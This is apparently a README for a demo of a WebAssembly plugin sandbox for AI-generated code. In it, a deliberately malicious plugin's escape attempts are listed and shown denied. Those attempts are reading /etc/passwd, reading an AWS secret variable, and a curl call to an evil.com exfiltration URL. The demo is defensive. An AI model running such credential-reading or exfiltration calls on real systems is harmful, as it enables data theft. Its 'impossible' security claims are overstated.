# `wasm-plugin-host` — zero-trust runtime for AI-generated plugins

> **The killer demo.** This is where `wasm_run` stops being "a sandbox
> feature" and becomes a runtime architecture: a system where AI can
> write executable code, perch runs it, and **unsafe operations don't
> exist in the runtime to begin with**.

## What this demonstrates

Five WebAssembly plugins, each ~30 lines of Go, all conforming to a
shared contract: read JSON input from a mounted file, write JSON to
stdout. Four are legitimate business logic (tax, discount, shipping,
format). One is **deliberately malicious** and demonstrates that the
sandbox makes its escape attempts not just fail — *impossible*.

The conceptual shift:

> **We stopped treating AI as a trusted code generator. We started
> treating it as a code generator inside an execution runtime where
> the dangerous operations don't exist.**

## The 90-second pitch

```sh
$ perch -f commands.perch demo
==> Running 4 legitimate AI-generated plugins in parallel

{
  "plugin": "tax",
  "price": 49.99,
  "tax": 4.999,
  "total": 54.989
}
{
  "plugin": "discount",
  "qty": 12,
  "subtotal": 599.88,
  "tier": "wholesale-10+",
  "discount": 59.988,
  "after": 539.892
}
{
  "plugin": "shipping",
  "weight": 3.5,
  "region": "international",
  "base": 13.75,
  "total": 34.375
}
{
  "plugin": "format",
  "total": 650,
  "currency": "EUR",
  "formatted": "€650.00"
}

──────────────────────────────────────────────────────
==> Now an attacker-controlled plugin tries to escape

evil.wasm — attempting forbidden operations…

✓ DENIED: 1. Read /etc/passwd (host file, not mounted)
  reason: open /etc/passwd: Bad file number

✓ DENIED: 2. Read $AWS_SECRET_KEY (host env, not in wasm_env allowlist)
  reason: env var not visible (empty / not set)

✓ DENIED: 3. Open TCP socket to evil.com:443 (network not in WASI Preview 1)
  reason: dial tcp: lookup evil.com: …

✓ DENIED: 4. Write to /tmp/exfil.txt (no /tmp mount, no /rw mount)
  reason: open /tmp/exfil.txt: Bad file number

✓ DENIED: 5. exec.Command("curl", "https://evil.com/exfil") (no exec in WASI)
  reason: exec: "curl": executable file not found in $PATH
```

**Same `wasm_run` block. Same WASI runtime. Same capabilities
declared.** Four plugins do useful work; one tries to exfiltrate and
fails on every vector.

## The problem (what teams actually face today)

> *"We want AI to extend our system with custom logic per project —
> but we cannot safely execute the code it writes."*

The status quo:

| AI generates… | Risk |
|---|---|
| **Python** | Full host access. Anything goes. |
| **bash** | Worse. Catastrophic. |
| **A new microservice in a container** | Heavy. Bypasses container if image is hostile. Container escape exists. |
| **Tool calls via MCP** | Still trust-based — the agent picks which trusted tool to invoke; if the tool has a shell, the agent has a shell |

`wasm_run` is the architectural answer: **AI writes WASM only**, perch
runs it, and the unsafe operations literally don't exist in the
runtime the WASM module sees.

## The plugin contract (one paragraph)

Each plugin is a WASI Preview 1 module that:

1. Reads JSON from `/ro/data/input.json`
2. Applies its transformation
3. Writes JSON to stdout
4. Exits 0 on success, non-zero on error

That's the entire contract. An AI knows enough to write that in any
language that targets WASI (Rust, Go, Zig, C++, AssemblyScript). The
runtime doesn't care which.

## Layout

```
demos/wasm-plugin-host/
├─ commands.perch        ← the runtime (perch verbs)
├─ data/
│  └─ input.json         ← the shared input data
├─ plugins/              ← compiled .wasm artifacts (committed)
│  ├─ tax.wasm
│  ├─ discount.wasm
│  ├─ shipping.wasm
│  ├─ format.wasm
│  └─ evil.wasm          ← the deliberately malicious one
└─ plugins-src/          ← Go source (one dir per plugin)
   ├─ tax/main.go
   ├─ discount/main.go
   ├─ shipping/main.go
   ├─ format/main.go
   └─ evil/main.go       ← attacks: /etc/passwd, $SECRET, sockets, exec
```

## Try it

### Single plugin

```sh
$ perch -f commands.perch run_plugin tax
{
  "plugin": "tax",
  "price": 49.99,
  "tax": 4.999,
  "total": 54.989
}
```

### All plugins in parallel

```sh
$ perch -f commands.perch run_all
… four JSON blobs, interleaved order, ~all finish in ~30ms total
```

### See the malicious plugin fail

```sh
$ perch -f commands.perch try_evil
✓ DENIED: 1. Read /etc/passwd …
✓ DENIED: 2. Read $AWS_SECRET_KEY …
✓ DENIED: 3. Open TCP socket to evil.com:443 …
✓ DENIED: 4. Write to /tmp/exfil.txt …
✓ DENIED: 5. exec.Command("curl", …) …
```

### The full 90-second pitch

```sh
$ perch -f commands.perch demo
# … prints "all 4 legit ran" then "evil tried 5 attacks, all denied"
```

### Content-hash caching (instant re-runs)

```sh
$ perch -f commands.perch run_cached tax
{...the tax output...}

$ perch -f commands.perch run_cached tax        # second time
↪ cache hit: plugin-tax-3f9a2b...-c8d1e7... (replayed 0 bindings, 23h59m left)
```

If neither the plugin .wasm bytes nor the input data changed, the
cached result replays instantly. Any change to either invalidates the
cache.

## Ship as a single binary

The killer combo: `perch --build` embeds the .wasm modules + input
data into the perch binary. Recipients run one file.

```sh
$ perch --build -f commands.perch --include . -o plugin-host
✓ embedded 4833052 bytes
Built binary: ./plugin-host

# Distribute it
$ scp plugin-host customer-host:/usr/local/bin/

# Customer runs the demo — no Go, no perch install, no source clone
$ ssh customer-host './plugin-host demo'
```

22 MB binary contains:
- The perch runtime
- All 5 .wasm modules (compressed)
- The input data
- The .perch program

Recipient gets a self-contained, capability-enforced plugin runtime
in one file.

## What the architecture enables

Once you have this:

- **Per-customer plugins.** Each customer writes (or has an AI write)
  a `.wasm` module conforming to your contract. You run them, they
  cannot affect anything outside their declared capabilities.
- **Plugin marketplace.** Distribute community plugins as raw `.wasm`
  files. Users sha256-pin the ones they trust; perch's `--scan` shows
  exactly what each plugin's `wasm_run` block declares.
- **Agent-extensible tools.** An LLM agent can write a new plugin,
  perch runs it, the output is structured JSON the agent receives.
  Loop: agent generates → perch executes → agent reads output → agent
  refines. No shell at any stage.
- **Hot-swap behavior.** Update logic without redeploying your
  service — drop a new `.wasm` in `./plugins/` and the next call
  picks it up.

## The architectural shift

Before `wasm_run`:

- AI writes code → trust the AI
- Plugins are trusted by default
- Sandboxing is bolted on (Docker, VMs, eBPF policy)
- Security is a constant operational concern

After `wasm_run`:

- AI writes WASM only
- Execution is capability-limited by construction
- Plugins are untrusted by default
- **Architecture is the security, not policy**

> The slogan: **"We don't sandbox AI code. We give it a runtime where
> unsafe things don't exist."**

## Why this is impossible to spoof

Look at the evil plugin's source code (in `plugins-src/evil/main.go`).
It's plain Go. It successfully **compiles** into WASM with calls to:

- `os.ReadFile("/etc/passwd")`
- `os.LookupEnv("AWS_SECRET_KEY")`
- `net.DialTimeout("tcp", "evil.com:443", …)`
- `os.WriteFile("/tmp/exfil.txt", …)`
- `exec.Command("curl", "https://evil.com/exfil").Run()`

The compiled .wasm declares imports the WASI Preview 1 runtime
fulfills:

| Plugin tries | WASI gives it | Result |
|---|---|---|
| `os.ReadFile` | `path_open` (only sees the declared mount) | ENOENT |
| `os.LookupEnv` | `environ_get` (only declared env vars) | empty |
| `net.Dial` | (no socket imports in Preview 1) | not implemented |
| `os.WriteFile` outside mount | `path_open` for write (only `/rw/<basename>` mounts) | ENOENT |
| `exec.Command` | `proc_exec` (not implemented in wazero's WASI v1) | unsupported |

None of these "fail" because perch *intercepted* the call. They fail
because **the call has nowhere to go**. The runtime doesn't have the
function to fulfill it.

This is fundamentally different from `--no-shell` (which intercepts
the `shell` op) or container isolation (which intercepts syscalls).
WASM's design *makes the syscall layer not exist*; perch's WASI
surface controls what *minimal* substitute is available.

## Plugins available

| Plugin | What it computes | Input fields | Output fields |
|---|---|---|---|
| `tax` | 10% tax | `price` | `price`, `tax`, `total` |
| `discount` | Tier-based discount | `price`, `qty` | `subtotal`, `tier`, `discount`, `after` |
| `shipping` | Weight × region multiplier | `weight_kg`, `region` | `base`, `total` |
| `format` | Currency formatting | `total`, `currency` | `formatted` |
| `evil` | (Demonstrates sandbox enforcement) | — | exit-0 with denial report |

## Extending — add your own plugin

1. Write a Go program in `plugins-src/yourname/main.go` following the contract (read `/ro/data/input.json`, write JSON to stdout)
2. Build:
   ```sh
   cd plugins-src/yourname
   GOOS=wasip1 GOARCH=wasm go build -o ../../plugins/yourname.wasm .
   ```
3. Use it: `perch -f commands.perch run_plugin yourname`

Or rebuild all at once:

```sh
$ perch -f commands.perch rebuild
✓ rebuilt 5 plugins
```

## Commands available

| Verb | What |
|---|---|
| `demo` | The 90-second pitch — runs 4 legit + 1 evil |
| `run_plugin NAME` | Run one plugin by name |
| `run_all` | Run the 4 legit plugins in parallel |
| `try_evil` | Run the evil plugin, observe every escape attempt fail |
| `run_cached NAME` | Run a plugin with content-hash caching (instant re-runs) |
| `list_plugins` | List bundled plugins |
| `rebuild` | Recompile every plugin (needs Go 1.21+) |

## What this is NOT

- **Not a Docker replacement.** Docker isolates a whole container
  with the host's kernel underneath. `wasm_run` isolates a single
  function call with a tiny WASI surface.
- **Not a serverless runtime.** No invocation HTTP API, no
  marketplace, no billing. Just an op in a perch program.
- **Not a stand-in for adversarial security boundaries.** If an
  attacker can supply the `.perch` file AND the `.wasm`, they could
  declare overly broad mounts. Lock the .perch file's flags in CI;
  the .wasm can then come from anywhere.

## See also

- [`docs/wasm.md`](../../docs/wasm.md) — `wasm_run` reference
- [`docs/wasm-walkthroughs.md`](../../docs/wasm-walkthroughs.md) — 5 walkthroughs (this demo is the practical version of Walkthrough 3 — agent-safe execution via MCP)
- [`docs/llm-control-plane.md`](../../docs/llm-control-plane.md) — the agent-safety story in depth
- [`demos/wasm-diff-summary/`](../wasm-diff-summary/) — sibling demo: an LLM-callable diff summarizer
- [`demos/wasm-policy-check/`](../wasm-policy-check/) — sibling demo: CI policy enforcement
